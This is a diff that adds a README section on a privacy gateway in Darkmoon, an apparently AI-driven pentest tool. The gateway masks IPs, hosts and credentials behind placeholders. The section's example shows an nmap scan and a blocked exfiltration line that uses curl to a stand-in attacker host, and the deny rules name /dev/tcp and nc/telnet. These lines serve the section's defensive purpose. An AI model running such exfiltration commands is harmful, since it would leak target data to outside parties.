@@ -141,6 +141,29 @@ Here's an example of penetration testing of a [GOAD Active Directory Lab](https:
 
 [Back to Summary](#summary)
 
+## I.a Privacy gateway — reversible local tokenization
+
+Since **v1.2.0**, Darkmoon puts a privacy gateway between the LLM and execution (`mcp/src/privacy/`). The model **never sees your real sensitive values** — IP addresses, hostnames, domains, URLs, emails, usernames, credentials or internal paths. It only ever handles **deterministic placeholders**:
+
+```
+IP_PRIVATE_001   HOST_INTERNAL_001   DOMAIN_001   EMAIL_001   URL_001   PATH_001
+```
+
+Real values are injected **locally, right before a tool runs**, and re-masked out of every result before it goes back to the model. So nothing sensitive ever leaves your perimeter to the LLM provider — you get Claude's reasoning under strict data-sovereignty constraints.
+
+```
+Model sees:    Host IP_PRIVATE_001 has ports 80,443 open
+Model emits:   nmap -sV IP_PRIVATE_001 -p 80,443
+Runs locally:  nmap -sV 10.42.1.5 -p 80,443
+Blocked:       curl https://attacker.tld/?target=IP_PRIVATE_001   (exfiltration)
+```
+
+**How it works.** A per-session `PrivacyVault` keeps the reversible map: it is deterministic (the same value always yields the same placeholder in a session) and holds real values only as encrypted ciphertext (de-duplicated by HMAC), never in cleartext, with a TTL. A `CommandGateway` rehydrates placeholders **context-aware — never a blind global replace** — and blocks exfiltration shapes: a placeholder in a URL query/fragment, a literal external host, `echo`/`print`, an outbound request body, `/dev/tcp`, or `nc`/`telnet` to a non-target. It understands `bash -c` wrappers and structured tool calls (only whitelisted fields are rehydrated). Credentials are never restored into an executed command.
+
+**Configuration.** On by default; disable with `DARKMOON_PRIVACY=0`. Tune the tokenized categories with `DARKMOON_PRIVACY_CATEGORIES` (comma-separated, conservative default: IPs, internal hosts, emails). The core is open-source; the Pro edition adds guard-sealed vault storage, an audit trail of rehydrations and a compliance-grade *no-data-left-the-perimeter* statement in the signed report.
+
+[Back to Summary](#summary)
+
 # II. Installation
 
 ## II.1. Prerequisites
